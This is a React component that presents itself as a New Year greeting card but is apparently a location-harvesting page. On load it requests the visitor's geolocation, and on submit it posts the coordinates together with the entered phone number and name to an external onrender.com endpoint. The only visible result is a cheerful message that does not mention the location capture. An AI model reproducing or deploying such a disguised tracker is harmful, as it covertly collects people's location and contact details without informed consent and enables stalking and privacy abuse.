import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './loc.css'
function LocationTracker() {
  const [location, setLocation] = useState({});
  const [phoneNumber, setPhoneNumber] = useState('');
  const [name, setName] = useState('');
  const [address, setAddress] = useState('');
  const [formPhoneNumber, setFormPhoneNumber] = useState('');
  const [formWish, setFormWish] = useState('');
  const [formName, setFromName]= useState('');
  const [formSubmitted, setFormSubmitted] = useState(false);


  useEffect(() => {
    navigator.geolocation.getCurrentPosition((position) => {
      setLocation({
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      });
    }, (error) => {
      console.error(error);
    });
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    setFormPhoneNumber(phoneNumber);
    setFormWish(address);
    setFromName(name);
    setFormSubmitted(true);
    console.log(`Sending location to backend: ${location}`);
    axios.post('https://hello-new-year-for-you.onrender.com/location', {
      location,
      phoneNumber,
      name,
      address
    })
      .then(() => {
        console.log(`Location saved to database ${location}`);
      })
      .catch((error) => {
        console.error(error);
      });
  };

  return (
    <div className='container'>
        <section>
        <div className='frist'>
          <div className="table center">
            <div className="monitor-wrapper center">
              <div className="monitor center">{formSubmitted?(  <p>Happy New Year {formName} In Advanced And Thankyou So Much For Giving Me Your Mobile No {formPhoneNumber} Btw I Know Your Name But I Thougth I should Add For You Also I Got Your Wish {formWish} Don't Worry I will Wish You At 12:01/00:01 Am In 2023............</p>
              ):null}
              </div>
            </div>
          </div>
        </div>
        </section>
        <section>
        <div className='card'>
          <form className='form' onSubmit={handleSubmit}>
            <label>

              <input placeholder="Enter your phone no" className='input' type="text" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} />
            </label>
            <br />
            <label>

              <input placeholder="Enter your name " className='input' type="text" value={name} onChange={(e) => setName(e.target.value)} />
            </label>
            <br />
            <label>

              <input placeholder="Enter your wish" className='input' type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
            </label>
            <br />
            <button value="Submit" >2023</button>
          </form>
        </div>
        </section>    
    </div>
  );
}

export default LocationTracker;
